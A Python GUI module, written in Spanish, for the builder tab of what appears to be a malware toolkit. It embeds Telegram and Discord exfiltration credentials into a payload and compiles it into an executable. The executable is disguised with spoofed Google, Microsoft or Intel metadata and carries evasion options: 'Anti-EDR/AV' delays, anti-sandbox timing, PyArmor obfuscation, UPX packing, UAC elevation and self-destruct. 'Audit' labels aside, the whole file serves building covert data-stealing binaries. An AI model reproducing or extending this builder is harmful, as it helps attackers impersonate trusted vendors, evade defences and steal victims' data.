"""
Tab: Builder
────────────
Graphical front-end for build.py — Universal Tactical Compiler:
  • Credential embedding (for audit stubs)
  • Universal script compilation (including the GUI)
  • Icon picker & Metadata spoofing
  • Real-time console output
"""

import threading
import subprocess
import sys
import base64
import customtkinter as ctk
from pathlib import Path
from tkinter import filedialog
import re

from gui.theme import (
    COLORS, FONTS, PAD,
    make_card, make_label, make_button, make_entry,
    make_section_header, make_badge,
    add_clear_button, add_reveal_button,
    add_folder_button, add_file_button, add_open_button,
    add_refresh_button, add_copy_button,
)


class BuilderView(ctk.CTkScrollableFrame):
    """Graphical builder wrapping build.py with scroll support."""

    PRESETS = {
        "Google":    {
            "company": "Google LLC",
            "desc": "Google Update Setup",
            "product": "Google Update",
            "copyright": "Copyright Google LLC. All rights reserved.",
            "name": "GoogleUpdate"
        },
        "Microsoft": {
            "company": "Microsoft Corporation",
            "desc": "Windows Security Health Service",
            "product": "Windows Operating System",
            "copyright": "© Microsoft Corporation. All rights reserved.",
            "name": "WinSecHealth"
        },
        "Intel":     {
            "company": "Intel Corporation",
            "desc": "Intel(R) Content Protection Framework",
            "product": "Intel(R) Management Engine Components",
            "copyright": "Copyright (c) Intel Corporation.",
            "name": "IntelCPF"
        },
        "Personalizado": None,
    }

    # Opciones con notas de uso táctico
    DELAY_PRESETS = [
        "0 (Instantáneo - Riesgo Alto)",
        "10 (Básico - Estándar)",
        "30 (Recomendado - Equilibrio)",
        "60 (Seguro - Anti-Sandbox)",
        "120 (Máximo Sigilo - EDR Bypass)",
        "300 (Extremo - Auditoría Lenta)"
    ]

    SEND_DELAY_PRESETS = [
        "0 (Rápido - Sin pausa)",
        "1",
        "2 (Recomendado)",
        "5",
        "10 (Sigilo - Evita Bursts)"
    ]

    TIMEOUT_PRESETS = [
        "5 (Red Rápida)",
        "15 (Estándar)",
        "30 (Lenta / Proxy)",
        "60 (Inestable / Satelital)"
    ]

    def __init__(self, parent):
        super().__init__(
            parent, 
            fg_color="transparent",
            scrollbar_button_color=COLORS["accent_dim"],
            scrollbar_button_hover_color=COLORS["accent"]
        )
        self._building = False
        self._build_ui()

    # ── UI Construction ───────────────────────────────────────────────────────

    def _build_ui(self):
        # ── Credentials card ─────────────────────────────────────────────────
        make_section_header(self, "Configuración del Binario (Universal)", "⚙️")
        cred_card = make_card(self)
        cred_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        cred_inner = ctk.CTkFrame(cred_card, fg_color="transparent")
        cred_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        # --- Row: Telegram Token ---
        r1 = ctk.CTkFrame(cred_inner, fg_color="transparent")
        r1.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r1, "Telegram Token:", style="small", color=COLORS["text_secondary"], width=120, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._cred_tg_token = make_entry(r1, placeholder="123456:ABC-DEF...", show="*", width=340)
        self._cred_tg_token.pack(side="left", padx=(0, PAD["xs"]))
        add_reveal_button(r1, self._cred_tg_token).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r1, self._cred_tg_token).pack(side="left")

        # --- Row: Telegram Chat ID ---
        r2 = ctk.CTkFrame(cred_inner, fg_color="transparent")
        r2.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r2, "Chat ID:", style="small", color=COLORS["text_secondary"], width=120, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._cred_tg_chat = make_entry(r2, placeholder="-100123...", width=340)
        self._cred_tg_chat.pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r2, self._cred_tg_chat).pack(side="left")

        # --- Row: Discord Webhook ---
        r3 = ctk.CTkFrame(cred_inner, fg_color="transparent")
        r3.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(r3, "Discord Webhook:", style="small", color=COLORS["text_secondary"], width=120, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._cred_dc_hook = make_entry(r3, placeholder="https://discord.com/api/webhooks/...", show="*", width=340)
        self._cred_dc_hook.pack(side="left", padx=(0, PAD["xs"]))
        add_reveal_button(r3, self._cred_dc_hook).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r3, self._cred_dc_hook).pack(side="left")

        hint = ctk.CTkFrame(cred_inner, fg_color=COLORS["info_dim"], corner_radius=6)
        hint.pack(fill="x", pady=(PAD["xs"], 0))
        make_label(hint, "  💡 Las credenciales se incrustan en el ejecutable codificadas en Base64 — no quedan en texto plano.", style="small", color=COLORS["info"]).pack(side="left", padx=PAD["sm"], pady=PAD["xs"])

        # ── Metadata / Spoofing card ──────────────────────────────────────────
        make_section_header(self, "Metadatos del Ejecutable (Spoofing)", "🎭")
        meta_card = make_card(self)
        meta_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        meta_inner = ctk.CTkFrame(meta_card, fg_color="transparent")
        meta_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        # Preset row
        rp = ctk.CTkFrame(meta_inner, fg_color="transparent")
        rp.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(rp, "Preset:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._preset_var = ctk.StringVar(value="Google")
        ctk.CTkOptionMenu(
            rp, values=list(self.PRESETS.keys()), variable=self._preset_var, command=self._apply_preset,
            fg_color=COLORS["bg_input"], button_color=COLORS["accent_dim"],
            button_hover_color=COLORS["accent"], dropdown_fg_color=COLORS["bg_card"],
            dropdown_hover_color=COLORS["bg_card_hover"], font=FONTS["body"],
            text_color=COLORS["text_primary"], width=180,
        ).pack(side="left")

        self._name_var = ctk.StringVar(value="SysHealth")

        grid = ctk.CTkFrame(meta_inner, fg_color="transparent")
        grid.pack(fill="x", pady=(PAD["sm"], 0))

        fields = [
            ("Empresa:",       "company",  "Google LLC"),
            ("Descripción:",   "desc",     "Google Update Setup"),
            ("Producto:",      "product",  "Google Update"),
            ("Copyright:",     "copyright","Copyright Google LLC."),
            ("Nombre EXE:",    "name",     "SysHealth"),
            ("Versión:",       "version",  "1.2.0.0"),
        ]
        self._meta_fields: dict[str, ctk.CTkEntry] = {}
        for i, (label, key, default) in enumerate(fields):
            col = i % 2
            row_frame = ctk.CTkFrame(grid, fg_color="transparent")
            row_frame.grid(row=i // 2, column=col, sticky="w", padx=(0 if col == 0 else PAD["lg"], 0), pady=PAD["xs"])
            make_label(row_frame, label, style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
            entry = make_entry(row_frame, placeholder=default, width=240)
            if key == "name": entry.configure(textvariable=self._name_var)
            else: entry.insert(0, default)
            entry.pack(side="left", padx=(0, PAD["xs"]))
            add_clear_button(row_frame, entry).pack(side="left")
            self._meta_fields[key] = entry

        # ── Compilation options card ──────────────────────────────────────────
        make_section_header(self, "Opciones de Compilación", "🔨")
        comp_card = make_card(self)
        comp_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        comp_inner = ctk.CTkFrame(comp_card, fg_color="transparent")
        comp_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        comp_layout = ctk.CTkFrame(comp_inner, fg_color="transparent")
        comp_layout.pack(fill="x")

        l_col = ctk.CTkFrame(comp_layout, fg_color="transparent")
        l_col.pack(side="left", fill="both", expand=True)

        r_col = ctk.CTkFrame(comp_layout, fg_color="transparent")
        r_col.pack(side="right", fill="both", padx=(PAD["lg"], 0))

        # --- LEFT COLUMN (INPUTS) ---
        L_LABEL_W = 155

        # Origen
        r_src = ctk.CTkFrame(l_col, fg_color="transparent")
        r_src.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r_src, "Origen (.py):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._source_var = ctk.StringVar(value="main.py" if Path("main.py").exists() else "")
        src_entry = make_entry(r_src, placeholder="archivo_principal.py", width=240)
        src_entry.configure(textvariable=self._source_var)
        src_entry.pack(side="left", padx=(0, PAD["xs"]))
        add_file_button(r_src, callback=lambda p: self._source_var.set(p), filetypes=[("Archivos Python", "*.py")], text="📄").pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r_src, src_entry).pack(side="left")

        # Icono
        r_in = ctk.CTkFrame(l_col, fg_color="transparent")
        r_in.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r_in, "Ícono (.ico):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._icon_var = ctk.StringVar(value="app.ico" if Path("app.ico").exists() else "")
        icon_entry = make_entry(r_in, placeholder="app.ico", width=240)
        icon_entry.configure(textvariable=self._icon_var)
        icon_entry.pack(side="left", padx=(0, PAD["xs"]))
        add_file_button(r_in, callback=lambda p: self._icon_var.set(p), filetypes=[("Archivos de ícono", "*.ico")]).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r_in, icon_entry).pack(side="left")

        # Destino
        r_dist = ctk.CTkFrame(l_col, fg_color="transparent")
        r_dist.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r_dist, "Destino:", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._dist_var = ctk.StringVar(value="dist")
        dist_entry = make_entry(r_dist, placeholder="dist", width=240)
        dist_entry.configure(textvariable=self._dist_var)
        dist_entry.pack(side="left", padx=(0, PAD["xs"]))
        add_folder_button(r_dist, callback=lambda p: self._dist_var.set(p)).pack(side="left", padx=(0, PAD["xs"]))
        add_open_button(r_dist, get_path=lambda: self._dist_var.get() or ".").pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r_dist, dist_entry).pack(side="left")

        # Anti-EDR/AV Delay (DROPDOWN)
        r_delay = ctk.CTkFrame(l_col, fg_color="transparent")
        r_delay.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r_delay, "Anti-EDR/AV Delay (s):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._delay_var = ctk.StringVar(value=self.DELAY_PRESETS[2])
        self._delay_combo = ctk.CTkComboBox(
            r_delay, values=self.DELAY_PRESETS, variable=self._delay_var,
            fg_color=COLORS["bg_input"], border_color=COLORS["border"],
            button_color=COLORS["accent_dim"], button_hover_color=COLORS["accent"],
            dropdown_fg_color=COLORS["bg_card"], dropdown_hover_color=COLORS["bg_card_hover"],
            font=FONTS["body"], text_color=COLORS["text_primary"], width=300,
        )
        self._delay_combo.pack(side="left")

        # Retraso entre Envíos (NUEVO)
        r_sdelay = ctk.CTkFrame(l_col, fg_color="transparent")
        r_sdelay.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r_sdelay, "Delay entre Envíos (s):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._send_delay_var = ctk.StringVar(value=self.SEND_DELAY_PRESETS[2])
        self._send_delay_combo = ctk.CTkComboBox(
            r_sdelay, values=self.SEND_DELAY_PRESETS, variable=self._send_delay_var,
            fg_color=COLORS["bg_input"], border_color=COLORS["border"],
            button_color=COLORS["accent_dim"], button_hover_color=COLORS["accent"],
            dropdown_fg_color=COLORS["bg_card"], dropdown_hover_color=COLORS["bg_card_hover"],
            font=FONTS["body"], text_color=COLORS["text_primary"], width=300,
        )
        self._send_delay_combo.pack(side="left")

        # Timeout Webhooks (NUEVO)
        r_timeout = ctk.CTkFrame(l_col, fg_color="transparent")
        r_timeout.pack(fill="x")
        make_label(r_timeout, "Timeout Webhooks (s):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._timeout_var = ctk.StringVar(value=self.TIMEOUT_PRESETS[1])
        self._timeout_combo = ctk.CTkComboBox(
            r_timeout, values=self.TIMEOUT_PRESETS, variable=self._timeout_var,
            fg_color=COLORS["bg_input"], border_color=COLORS["border"],
            button_color=COLORS["accent_dim"], button_hover_color=COLORS["accent"],
            dropdown_fg_color=COLORS["bg_card"], dropdown_hover_color=COLORS["bg_card_hover"],
            font=FONTS["body"], text_color=COLORS["text_primary"], width=300,
        )
        self._timeout_combo.pack(side="left")

        # --- RIGHT COLUMN (CHECKBOXES) ---
        self._obfuscate_var    = ctk.BooleanVar(value=False)
        self._show_console_var = ctk.BooleanVar(value=False)
        self._multifile_var    = ctk.BooleanVar(value=False)
        self._uac_var          = ctk.BooleanVar(value=False)
        self._clean_var        = ctk.BooleanVar(value=True)
        self._upx_var          = ctk.BooleanVar(value=False)
        self._self_destruct_var = ctk.BooleanVar(value=False)

        opts_inner = ctk.CTkFrame(r_col, fg_color="transparent")
        opts_inner.pack(pady=PAD["xs"])
        c1, c2 = ctk.CTkFrame(opts_inner, fg_color="transparent"), ctk.CTkFrame(opts_inner, fg_color="transparent")
        c1.pack(side="left", padx=(0, PAD["md"]))
        c2.pack(side="left")

        for label, var in [("🛡 Ofuscar con PyArmor", self._obfuscate_var), ("🖥 Mostrar consola", self._show_console_var), ("📂 Multi-archivo", self._multifile_var)]:
            ctk.CTkCheckBox(c1, text=label, variable=var, fg_color=COLORS["accent"], font=FONTS["body"]).pack(anchor="w", pady=PAD["xs"])
        for label, var in [("⚡ Limpiar temporales", self._clean_var), ("🔑 Solicitar Admin (UAC)", self._uac_var), ("📦 Compresión UPX", self._upx_var), ("💥 Autodestrucción", self._self_destruct_var)]:
            ctk.CTkCheckBox(c2, text=label, variable=var, fg_color=COLORS["accent"], font=FONTS["body"]).pack(anchor="w", pady=PAD["xs"])

        # ── Build button card ─────────────────────────────────────────────────
        btn_container = ctk.CTkFrame(self, fg_color="transparent")
        btn_container.pack(fill="x", padx=PAD["lg"], pady=(PAD["sm"], PAD["md"]))
        self._build_btn = make_button(btn_container, "🔨 INICIAR COMPILACIÓN", command=self._start_build, style="primary", width=280, height=48)
        self._build_btn.configure(font=("Segoe UI", 14, "bold"))
        self._build_btn.pack(pady=PAD["md"])

        # ── Log section ───────────────────────────────────────────────────────
        log_header = make_section_header(self, "Salida del Build", "📋")
        self._status_container = ctk.CTkFrame(log_header, fg_color="transparent")
        self._status_container.pack(side="right", padx=(PAD["sm"], 0))
        make_label(self._status_container, "ESTADO:", style="tiny", color=COLORS["text_muted"]).pack(side="left", padx=(0, PAD["xs"]))
        self._build_status = make_badge(self._status_container, "ESPERANDO", "text_muted")
        self._build_status.pack(side="left")

        log_card = make_card(self)
        log_card.pack(fill="both", expand=True, padx=PAD["lg"], pady=(0, PAD["lg"]))
        toolbar = ctk.CTkFrame(log_card, fg_color="transparent")
        toolbar.pack(fill="x", padx=PAD["sm"], pady=(PAD["sm"], 0))
        make_button(toolbar, "🗑 Limpiar log", command=self._clear_logs, style="secondary", width=120).pack(side="left", padx=(0, PAD["xs"]))
        add_copy_button(toolbar, get_text=lambda: self._log.get("0.0", "end"), text="📋 Copiar log", width=120).pack(side="left", padx=(0, PAD["xs"]))
        add_open_button(toolbar, get_path=lambda: self._dist_var.get() or "dist", text="📂 Abrir ubicación", width=140).pack(side="left", padx=(0, PAD["xs"]))
        make_button(toolbar, "🔥 Eliminar builds", command=self._delete_builds, style="danger", width=140).pack(side="left")

        self._log = ctk.CTkTextbox(
            log_card, fg_color=COLORS["bg_terminal"], text_color=COLORS["text_terminal"],
            font=FONTS["code"], corner_radius=8, border_width=1, border_color=COLORS["border"],
            height=350, state="disabled",
        )
        self._log.pack(fill="x", padx=PAD["sm"], pady=PAD["sm"])
        for tag, color in [("OK", "success"), ("ERR", "danger"), ("INFO", "info"), ("SYSTEM", "accent"), ("TIMESTAMP", "text_muted")]:
            self._log._textbox.tag_configure(tag, foreground=COLORS[color])

        self._log_line("TIMESTAMP", "Configurá las opciones y presioná BUILD para compilar.")
        self._apply_preset("Google")

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _apply_preset(self, name: str):
        preset = self.PRESETS.get(name)
        if not preset:
            for key, entry in self._meta_fields.items():
                entry.delete(0, "end")
                if key == "name": self._name_var.set("")
            return
        for key, val in preset.items():
            entry = self._meta_fields.get(key)
            if entry:
                entry.delete(0, "end")
                entry.insert(0, val)
                if key == "name": self._name_var.set(val)

    def _log_line(self, tag: str, msg: str):
        from datetime import datetime
        ts = datetime.now().strftime("%H:%M:%S")
        self._log.configure(state="normal")
        self._log._textbox.insert("end", f"[{ts}] ", "TIMESTAMP")
        self._log._textbox.insert("end", msg + "\n", tag)
        self._log._textbox.see("end")
        self._log.configure(state="disabled")

    def _clear_logs(self):
        self._log.configure(state="normal")
        self._log.delete("0.0", "end")
        self._log.configure(state="disabled")
        audit_log = Path(".audit/pentest_audit.log")
        if audit_log.exists():
            try: audit_log.write_text("", encoding="utf-8")
            except: pass

    def _delete_builds(self):
        import shutil
        for d in [Path(self._dist_var.get() or "dist"), Path("build"), Path("tmp")]:
            if d.exists() and d.is_dir():
                try: shutil.rmtree(d)
                except: pass
        for f in Path(".").glob("*.spec"):
            try: f.unlink()
            except: pass
        self._log_line("INFO", "Entorno de build limpiado.")

    def _embed_credentials(self) -> str:
        src = Path("main.py").read_text(encoding="utf-8")
        tg_token = base64.b64encode(self._cred_tg_token.get().strip().encode()).decode()
        tg_chat  = base64.b64encode(self._cred_tg_chat.get().strip().encode()).decode()
        dc_hook  = base64.b64encode(self._cred_dc_hook.get().strip().encode()).decode()

        patched = re.sub(r'"tg_token":\s*""', f'"tg_token":   "{tg_token}"', src)
        patched = re.sub(r'"tg_chat_id":\s*""', f'"tg_chat_id": "{tg_chat}"', patched)
        patched = re.sub(r'"ds_webhook":\s*""', f'"ds_webhook": "{dc_hook}"', patched)
        
        # Extracción de Delay de Inicio
        try: 
            v1 = self._delay_var.get().strip()
            n1 = int(re.search(r'\d+', v1).group())
            d1 = max(0, min(n1, 3600)) 
        except: d1 = 0
        patched = re.sub(r'"delay":\s*\d+', f'"delay":      {d1}', patched)

        # Extracción de Delay entre Envíos
        try: 
            v2 = self._send_delay_var.get().strip()
            n2 = int(re.search(r'\d+', v2).group())
            d2 = max(0, min(n2, 60)) 
        except: d2 = 0
        patched = re.sub(r'"send_delay":\s*\d+', f'"send_delay": {d2}', patched)

        # Extracción de Timeout de Webhooks
        try: 
            v3 = self._timeout_var.get().strip()
            n3 = int(re.search(r'\d+', v3).group())
            d3 = max(1, min(n3, 300)) 
        except: d3 = 15
        patched = re.sub(r'"webhook_timeout":\s*\d+', f'"webhook_timeout": {d3}', patched)

        return patched

    def _start_build(self):
        if self._building: return
        self._building = True
        self._build_btn.configure(state="disabled", text="🔨  COMPILANDO…")
        self._build_status.configure(text="  COMPILANDO…  ", fg_color=COLORS["accent_dim"], text_color=COLORS["accent"])
        threading.Thread(target=self._build_worker, daemon=True).start()

    def _build_worker(self):
        import subprocess, shutil
        self._has_errors = False
        src_file = self._source_var.get() or "main.py"
        # Detección inteligente: solo parcheamos si el origen es el main.py de la suite
        is_suite_main = Path(src_file).name == "main.py"
        patched_src = self._embed_credentials() if is_suite_main else None
        
        cmd = [sys.executable, str(Path("build.py").resolve()), src_file]
        for flag, key in [("--name", "name"), ("--company", "company"), ("--desc", "desc"), ("--product", "product"), ("--copyright", "copyright"), ("--version", "version")]:
            val = self._meta_fields[key].get().strip()
            if val: cmd += [flag, val]

        if not self._obfuscate_var.get(): cmd.append("--no-obf")
        if self._show_console_var.get(): cmd.append("--show-console")
        if self._multifile_var.get(): cmd.append("--multi-file")
        if self._uac_var.get(): cmd.append("--uac-admin")
        if self._clean_var.get(): cmd.append("--clean")
        if self._upx_var.get():
            upx_path = next((p for p in ["upx.exe", "tools/upx"] if Path(p).exists()), None)
            if upx_path: cmd += ["--upx", upx_path]

        dist = self._dist_var.get() or "dist"
        cmd += ["--dist-dir", dist]
        icon = self._icon_var.get()
        if icon and Path(icon).exists(): cmd += ["--icon", icon]

        patched_cwd, orig_backup = Path("_main_build_patched.py"), Path("_main_backup.py")
        try:
            if patched_src:
                patched_cwd.write_text(patched_src, encoding="utf-8")
                shutil.copy2(src_file, orig_backup)
                patched_cwd.replace(src_file)

            proc = subprocess.Popen(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT, 
                text=True, 
                encoding="utf-8", 
                errors="replace",
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
            for line in proc.stdout:
                line = line.rstrip()
                if not line: continue
                tag = "OK" if "[+]" in line else "ERR" if any(x in line.lower() for x in ["[-]", "error", "failed"]) else "INFO"
                if tag == "ERR": self._has_errors = True
                self.after(0, lambda l=line, t=tag: self._log_line(t, l))
            proc.wait()
            success = proc.returncode == 0
        except Exception as e:
            self.after(0, lambda: self._log_line("ERR", f"Error: {e}"))
            success = False
        finally:
            if orig_backup.exists(): orig_backup.replace(src_file)
            patched_cwd.unlink(missing_ok=True)

        if success and not self._has_errors:
            self.after(0, lambda: self._build_status.configure(text="  ✓ EXITOSO  ", fg_color=COLORS["success_dim"], text_color=COLORS["success"]))
        else:
            self.after(0, lambda: self._build_status.configure(text="  ✗ ERROR  ", fg_color=COLORS["danger_dim"], text_color=COLORS["danger"]))
        self.after(0, self._finish_build)

    def _finish_build(self):
        self._building = False
        self._build_btn.configure(state="normal", text="🔨  INICIAR COMPILACIÓN")
